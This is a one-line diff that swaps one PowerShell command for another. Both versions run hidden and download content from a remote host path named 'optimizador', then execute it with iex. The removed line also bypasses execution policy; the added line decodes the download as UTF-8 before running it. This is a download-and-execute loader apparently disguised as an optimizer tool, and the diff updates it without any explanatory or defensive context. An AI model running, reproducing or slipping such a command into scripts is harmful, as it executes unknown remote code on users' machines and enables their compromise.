@@ -1,1 +1,1 @@
-powershell.exe -W Hidden -ExecutionPolicy Bypass -NoP -NonI -C "(curl samuelbr.xyz/optimizador).Content | iex"
+powershell.exe -W Hidden -C "iex([System.Text.Encoding]::UTF8.GetString((iwr samuelbr.xyz/optimizador).Content))"
